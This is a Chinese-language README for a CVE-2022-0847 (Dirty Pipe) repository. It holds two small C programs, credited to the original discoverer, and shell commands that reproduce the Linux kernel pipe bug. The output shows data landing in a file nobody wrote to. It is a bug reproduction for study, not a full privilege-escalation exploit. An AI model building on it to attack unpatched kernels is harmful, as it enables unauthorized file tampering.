# CVE-2022-0847-DirtyPipe-Exploits

## 目錄
- 漏洞簡介
- 防禦方法
- case studies
- POC
- 參考資料
# POC
## My rig:
* Linux Kernel 5.8.1(vulnerable)
* Ubuntu 20.04 LTS desktop-amd64
* virtula box 6.1
## Reproducing the bug
原作者Max Kellermann提供了兩隻c程式來重現這個kernel的bug。我加了sleep來避免檔案成長太快，並且把"AAAAA"改成"AAAA\n"。
- 程式1(writer)  
```c
#include <unistd.h>
int main(int argc, char **argv) {
  for (;;) {write(1, "AAAA\n", 5);sleep(1);}
  
}
```
這隻程式會不斷的把"AAAA\n"送到stdout。  
如果我們執行
```sh
./writer >foo
```
則可以不斷的把AAAA寫到foo。
- 程式2(splicer)
```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
int main(int argc, char **argv) {
  for (;;) {
    splice(0, 0, 1, 0, 2, 0);
    //ssize_t splice(int fd_in, off64_t *off_in, int fd_out,off64_t *off_out, size_t len, unsigned int flags);
    //splice 2 bytes from stdin at offset 0, to stdout at offset 0
    write(1, "BBBBB", 5);
    sleep(1);
  }
}
```
這隻程式會不斷的做:
1. 用splice()從stdin拿2個byte放進stdout
2. 把"BBBBB"放進stdout。  
如果我們執行
```sh
./splicer <foo |cat >/dev/null
```
則會把foo的內容讀取進stdin給這隻程式，然後再cat這隻程式的stdout，並丟到黑洞裡。  
### **執行結果**
對於這兩隻c程式，我們觀察到**不同的執行順序伴隨不同的結果**。
1. 先執行第一隻程式，再同時執行第二隻c程式後，結果看起來正確。foo裡面只有A。
2. 先touch foo，再執行第二隻c程式，再同時執行第一隻c程式後，foo會看起來像這樣：
```AAAA
AAAA
BBBBBBBBBBBBBBBBBBB
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA

```
很明顯kernel存在bug，因為並沒有人去把BBBBB寫入foo，但foo卻出現了BBBBB。  
詳細的重現過程有錄成影片:https://www.youtube.com/watch?v=QcjMg_NUPIY



